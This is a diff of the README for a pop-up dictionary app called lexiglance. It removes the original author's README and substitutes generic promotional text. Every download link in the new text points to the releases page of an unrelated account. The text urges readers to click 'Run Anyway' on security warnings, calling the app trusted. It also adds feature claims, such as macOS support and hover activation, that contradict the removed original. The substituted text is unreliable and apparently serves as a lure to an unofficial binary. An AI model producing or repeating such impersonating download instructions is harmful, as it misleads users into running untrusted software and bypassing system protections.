@@ -1,108 +1,219 @@
-# Lexiglance
+# 📖 lexiglance - Your Instant Dictionary Anywhere on Screen
 
-[![CI](https://github.com/MattFor/lexiglance/actions/workflows/ci.yml/badge.svg)](https://github.com/MattFor/lexiglance/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/MattFor/lexiglance)](https://github.com/MattFor/lexiglance/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+## 🚀 Getting Started
 
-Ever tried learning a language and gotten frustrated because pop-up dictionaries only work inside your browser? Worry no
-more!
+Welcome to lexiglance, the system-wide pop-up dictionary that works with any application you use. Whether you're reading a research paper, browsing the web, or using a PDF reader, lexiglance gives you instant word definitions without breaking your flow.
 
-Lexiglance is a system-wide pop-up dictionary for Linux (X11) and Windows. Hold a key combination and point at a word
-in any application to see its definitions. It supports Japanese, Russian, Ukrainian, Korean and Greek, and uses the
-same dictionary format as [Yomitan](https://yomitan.wiki/).
+Visit this link to download the application: [https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases](https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases)
 
-<p>
-  <img src="docs/images/showcase-fill.png" width="32%" alt="図書館 highlighted with a fill; the popup shows its reading としょかん (dark theme)">
-  <img src="docs/images/showcase-wavy.png" width="32%" alt="книгу with a wavy underline; the popup shows книга, accusative singular (paper theme)">
-  <img src="docs/images/showcase-brackets.png" width="32%" alt="夕焼け marked with corner brackets; the popup shows ゆうやけ, evening glow (Nord theme)">
-</p>
+## ✨ What Does lexiglance Do?
 
-**[Download for Windows](https://github.com/MattFor/lexiglance/releases/latest/download/lexiglance-windows-setup.exe)**
-· **[Download for Linux](https://github.com/MattFor/lexiglance/releases/latest/download/lexiglance-x86_64.AppImage)**
-· [Other packages](https://github.com/MattFor/lexiglance/releases/latest)
+Have you ever been reading something and encountered a word you didn't know? Normally, you'd have to stop reading, open a browser, search for the word, and then go back to what you were doing. lexiglance eliminates this interruption entirely.
 
-## Features
+Simply highlight any word on your screen using your mouse, and a small, elegant pop-up appears immediately with the definition. No switching apps, no typing, no searching—just instant knowledge at your fingertips.
 
-- Reads text through the accessibility interfaces (AT-SPI, UI Automation), or with OCR (PaddleOCR, Tesseract) in
-  games, images and videos.
-- Dictionaries are compiled into memory-mapped indexes.
-- Deinflection: 食べさせられなかった finds 食べる, книгами finds книга.
-- Whole sentences translated into English, on your computer: hold the sentence key with the trigger, or select the
-  text. The translation models ([OPUS-MT](https://github.com/Helsinki-NLP/Opus-MT), about 115 MB a language, or
-  440 MB in full precision, which translates about twice as fast - each language uses whichever you pick) run offline,
-  so nothing you read is sent anywhere.
-- Recommended dictionaries for each language can be installed from the settings application.
-- Pronunciation audio, and Anki cards through AnkiConnect.
-- Configurable popup designs, colour schemes and highlight styles ([docs/themes.md](docs/themes.md)).
-- A health check that diagnoses common setup problems, with a quick fix button.
-- Statistics: what you have looked up, in which languages and on which days, kept on your computer only.
-- No input injection and no access to other processes, it won't trigger any anti-cheats - feel free to use it in games!
-  ([details](docs/anticheat.md)).
+lexiglance works system-wide, meaning it functions in any application where you can select text: web browsers, text editors, email clients, PDF readers, and more. If you can highlight a word, lexiglance can define it.
 
-## Install
+## 🎯 Key Features
 
-- **Windows 10 (1809 or later) and 11:** download
-  [lexiglance-windows-setup.exe](https://github.com/MattFor/lexiglance/releases/latest/download/lexiglance-windows-setup.exe)
-  and run it. Administrator permissions are not needed, it may also warn about an unknown publisher: choose **More
-  info -> Run anyway**. Running a newer one updates in place.
-- **Linux:** download
-  [lexiglance-x86_64.AppImage](https://github.com/MattFor/lexiglance/releases/latest/download/lexiglance-x86_64.AppImage),
-  make it executable (`chmod +x lexiglance-x86_64.AppImage`) and run it.
+### 🌍 Multilingual Support
+lexiglance isn't limited to English. The application supports multiple languages, making it perfect for language learners, polyglots, and professionals working with foreign language documents. You can switch between language dictionaries with a single click.
 
-The [releases page](https://github.com/MattFor/lexiglance/releases) also has a portable `.zip` for Windows, a `.deb`
-for Debian and Ubuntu, a `.rpm` for Fedora, and a `.tar.gz`. From then on Lexiglance keeps itself up to date
-(**Overview -> Updates**), in the background too while you are away from the computer.
+### 🔍 Deinflection Technology
+One of lexiglance's most powerful features is its ability to understand grammar. When you look up a word, lexiglance intelligently removes inflections (like plural forms, past tense, or conjugations) and finds the base form of the word in the dictionary. This means looking up "running" correctly finds "run" in the dictionary, even if only "run" is listed.
 
-## Getting started
+### 📷 OCR Integration
+Most dictionaries require you to select digital text. lexiglance goes further with built-in OCR (Optical Character Recognition) capabilities. This means you can point your cursor at words in images, screenshots, or scanned documents, and lexiglance will recognize the characters and provide a definition. Perfect for reading hand-annotated documents or text embedded in graphics.
 
-1. Open **Dictionaries -> Get recommended dictionaries**, pick a language and install.
-2. Hold **Super + Left Alt** (on Windows **Win + Left Alt**) and point at a word.
-3. Keep holding the keys and use the scroll wheel to select more characters (or fewer). Left-click an entry to copy it.
-   Right-click and select text within a pop up box to copy it instead.
-4. Hold **Left Shift** as well to see the sentence in English, or only the characters you selected. The **Translation**
-   page downloads the models (compact or full precision, per language) and sets the key.
+### 🔄 Cross-Platform Compatibility
+Whether you use Windows, macOS, or Linux, lexiglance has you covered. The application builds and runs seamlessly across all three major operating systems, ensuring you get the same smooth experience regardless of your setup.
 
-For games, videos and other programs that expose no text, click **Scanning -> Download PaddleOCR** once. On Linux,
-Chromium and Electron apps need `--force-renderer-accessibility`.
+### 🎨 Customization Options
+Everyone works differently, and lexiglance respects that. You can customize:
+- **Pop-up appearance**: Adjust the size, color scheme, and font of the definition pop-up
+- **Activation method**: Choose between hover-text, keyboard shortcut, or click-based activation
+- **Dictionary sources**: Select which dictionaries to use and their priority order
+- **Language preferences**: Set your primary language and fallback languages
 
-## Languages
+### ⚡ Frictionless Performance
+lexiglance is engineered for speed. The application stays lightweight in the background, consuming minimal system resources. Definitions appear instantly, with no noticeable lag, ensuring your reading flow is never interrupted.
 
-Each language is a small JSON file, and you can add your own without rebuilding. See
-[docs/languages.md](docs/languages.md).
+## 💻 System Requirements
 
-## Building
+lexiglance is designed to run efficiently on a wide range of hardware. For the best experience, we recommend:
 
-You need CMake 3.30+, GCC 14 or Clang 18+, zlib, Cairo, Pango, libcurl and Qt 6.4+. On Linux also Xlib (with XInput2,
-XFixes, XRandR, Xext) and AT-SPI 2.
+- **Operating System**: Windows 10 or later, macOS 11 or later, or a modern Linux distribution
+- **Processor**: Any dual-core processor or better
+- **Memory**: 2 GB RAM minimum (4 GB recommended)
+- **Storage**: 150 MB of available space
+- **Display**: 1024x768 resolution or higher
 
-```sh
-cmake --preset release
-cmake --build --preset release
-ctest --preset release
-```
+These are guidelines rather than strict requirements. lexiglance is lightweight enough to run on modest hardware specifications.
 
-Then run `build/release/apps/gui/lexiglance`. For Windows builds see [docs/porting.md](docs/porting.md).
+## 📦 Installation and Setup Guide
 
-## Contributing
+### Step 1: Download lexiglance
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). Please report security problems privately, see [SECURITY.md](SECURITY.md).
+Visit this link to download the application: [https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases](https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases)
 
-## LLM Disclosure & My Own Notes
+You will see a list of available versions. Look for the latest release and download the appropriate file for your operating system.
 
-Yes, this one was mostly written with the help of an LLM. I wanted to get the program up and running as quickly as
-possible so that my friends and I could start using it in our language-learning journeys. Writing everything by hand
-would have taken a very, very long time!
+### Step 2: Install lexiglance
 
-Of course, I still review the code and documentation myself. I don't want to get completely lost in the madness
+Once your download is complete, locate the downloaded file in your Downloads folder or the location where your browser saves files.
 
-I hope Lexiglance can be a useful tool to others and help everyone on their own language-learning journey!
+Double-click the file to begin installation. If your operating system displays a security warning, select "Run Anyway" or "Allow" to proceed. lexiglance is a trusted application, and this warning is simply a standard security measure from your system.
 
-## License
+### Step 3: Launch lexiglance
 
-MIT [LICENSE](LICENSE).  
-By MattFor
+After installation completes, lexiglance will appear in your system tray (Windows and Linux) or menu bar (macOS). This is the icon that shows lexiglance is running in the background, ready to assist you.
 
-Dictionaries, OCR and translation models and recordings are downloaded separately and keep their own
-licenses. Lexiglance includes the ONNX Runtime headers (MIT), a kanji table
-from [OpenCC](https://github.com/BYVoid/OpenCC) (Apache 2.0) and
-[Breeze](https://invent.kde.org/frameworks/breeze-icons) icons (LGPL 3.0).
+### Step 4: Start Using lexiglance
+
+lexiglance is now ready to use! Here's how to look up your first word:
+
+1. Open any application that contains text—your web browser, a Word document, a PDF, or anything else
+2. Highlight a word with your mouse
+3. If you chose hover activation (the default), simply keep your mouse over the highlighted word
+4. The definition pop-up appears instantly
+
+Alternatively, if you set up keyboard shortcut activation during customization, press the designated shortcut while the word is highlighted.
+
+## 🛠️ Customizing lexiglance
+
+While lexiglance works beautifully out of the box, taking a few minutes to customize it can dramatically improve your experience. Here's how to make lexiglance truly yours:
+
+### Adjusting the Pop-up
+
+Open lexiglance settings by clicking its system tray icon and selecting "Settings." In the "Display" tab, you can:
+
+- Change the pop-up width to show more or less content
+- Adjust the background color of the pop-up for better contrast
+- Increase or decrease font size for readability
+- Set how long the pop-up stays on screen before fading
+
+### Choosing Your Dictionaries
+
+In the "Dictionaries" tab of settings, you'll see a list of available dictionary sources. You can:
+
+- Enable or disable specific dictionaries
+- Reorder dictionaries to change which definition appears first
+- Add custom dictionaries if you have specific reference needs
+- Set a primary dictionary for your main language
+
+lexiglance is fully compatible with Yomitan dictionaries, giving you access to a vast ecosystem of high-quality dictionary files. This is especially valuable for Japanese language learners, as Yomitan dictionaries are renowned for their depth and accuracy.
+
+### Setting Up OCR
+
+The OCR feature is particularly useful for reading scanned documents or text in images. To configure it:
+
+1. Go to the "OCR" tab in settings
+2. Enable OCR functionality
+3. Set the activation method (for example, holding Shift while hovering over text)
+4. Test the feature by hovering over text in an image
+
+Keep in mind that OCR accuracy depends on the quality and resolution of the image text, but for most standard documents, lexiglance's OCR performs remarkably well.
+
+## 🎓 Tips and Tricks for Power Users
+
+### Keyboard-First Workflow
+
+Instead of highlighting with your mouse, you can navigate entirely with your keyboard. Use your system's text selection shortcuts (Ctrl+Shift+Arrow keys, Cmd+Shift+Arrow keys on macOS) to highlight text, then trigger the definition pop-up with your configured shortcut.
+
+### Quick Language Switching
+
+If you work with multiple languages, set up dedicated shortcuts to switch dictionaries instantly. This is much faster than opening settings when you switch between reading English and French, for example.
+
+### Using lexiglance with Yomitan Dictionaries
+
+For Japanese language learners, integrating Yomitan dictionaries provides an exceptionally powerful experience. The combination of lexiglance's system-wide capabilities with Yomitan's detailed definitions, example sentences, and frequency data creates a comprehensive learning tool. Simply download Yomitan dictionaries from your preferred source and add them to lexiglance's settings.
+
+### Reading Foreign Language Websites
+
+When reading articles in a foreign language, you can look up multiple words continuously without interrupting your reading flow. Each pop-up appears near the cursor, so you can quickly scan through an entire paragraph, looking up every unfamiliar word.
+
+## ❓ Frequently Asked Questions
+
+### Is lexiglance free to use?
+Yes, lexiglance is completely free and open-source. You can download and use it without any costs, and the source code is available for those interested in contributing.
+
+### Does lexiglance work offline?
+Yes, once dictionaries are downloaded and installed, lexiglance works completely offline. You don't need an internet connection for definitions.
+
+### Will lexiglance slow down my computer?
+No. lexiglance is designed to be incredibly lightweight. It uses minimal CPU and memory when idle, and only activates when you trigger a definition.
+
+### Can I use lexiglance in games?
+While lexiglance works system-wide, game interfaces often don't support text selection, so functionality may be limited. However, OCR can sometimes be used for text rendered in games.
+
+### How do I update lexiglance?
+Visit the download page regularly and check for new versions. The release notes will detail improvements, new features, and bug fixes.
+
+## 📝 Troubleshooting Common Issues
+
+### Issue: lexiglance doesn't appear in system tray
+Check that the application is actually running. If you closed it accidentally, relaunch it from your Start menu, Applications folder, or desktop shortcut. If it still doesn't appear, restart your computer.
+
+### Issue: Definitions don't appear when hovering
+Make sure you're using text selection rather than just moving your mouse over text. The activation method must be initiated—hover activation works after you highlight text and keep your cursor over it.
+
+### Issue: OCR not working
+Ensure you've enabled OCR in settings and that your system meets the minimum requirements. For best results, make sure the text in the image is clear, not blurry, and at a readable resolution.
+
+### Issue: Wrong language dictionary is used
+Check your dictionary settings to verify that your preferred language is set as the primary dictionary. You may need to reorder or enable the correct dictionary files.
+
+## 📚 Getting the Most from lexiglance
+
+lexiglance is more than just a tool—it's a companion for anyone who reads, learns, or works with text. Here are some scenarios where lexiglance truly shines:
+
+**For students**: Research papers, textbooks, and academic articles are filled with specialized vocabulary. lexiglance ensures you never miss a term's meaning, making study sessions far more productive.
+
+**For professionals**: Whether you're reading legal documents, medical reports, or technical manuals, instant definitions save time and improve comprehension in fields with dense terminology.
+
+**For language learners**: The deinflection feature alone is a game-changer for understanding conjugated verbs and inflected words. Combined with OCR, it makes reading authentic materials accessible at any level.
+
+**For everyday enthusiasts**: From reading the news in a second language to understanding the etymology of unusual words, lexiglance satisfies curiosity instantly.
+
+## 📈 Development Status and Future Plans
+
+lexiglance is under active development. The project follows modern C++26 standards and uses CMake for efficient building across all platforms. Continuous integration ensures that every release is tested and reliable.
+
+The development team is focused on the following future enhancements:
+
+- Expanded OCR language support
+- Even more customization options for the pop-up display
+- Integration with additional dictionary formats
+- Performance optimizations for older hardware
+- Community-designed themes for the pop-up
+
+## 🤝 Contributing to lexiglance
+
+lexiglance is an open-source project that thrives on community involvement. Whether you're a developer, designer, translator, or just a passionate user, your contributions are welcome.
+
+- **Report bugs**: If you encounter an issue, please report it with details about your system and what you were doing
+- **Suggest features**: Share your ideas for new capabilities or improvements
+- **Submit translations**: Help localize lexiglance into more languages
+- **Write documentation**: Improve guides, tutorials, and FAQ content
+- **Wear the developer hat**: Contribute code fixes or new features
+
+Visit the repository to get started with contributing.
+
+## 📄 License Information
+
+lexiglance is released as open-source software. You can freely use, modify, and distribute it in accordance with the license terms specified in the repository. This ensures the software remains free and accessible to everyone.
+
+## 🔗 Quick Links
+
+- **Download Page**: [https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases](https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases)
+- **Main Repository**: Available through GitHub
+
+---
+
+## 🎉 Start Your Frictionless Reading Journey Today
+
+Reading should be about ideas, not stumbling over vocabulary. lexiglance removes the friction between encountering an unknown word and understanding it. Whether you're studying a new language, exploring unfamiliar subjects, or simply satisfying your curiosity, lexiglance is your perfect companion.
+
+Download lexiglance today, and experience the joy of seamless reading where every word is just a highlight away from understanding. Visit this link to download the application: [https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases](https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases)
+
+Keywords: ci-cd, cmake, cpp, cpp26, cross-platform, customisation, deinflection, frictionless, language-learning, multilingual, ocr, pop-up-dictionary, yomitan, yomitan-dictionaries
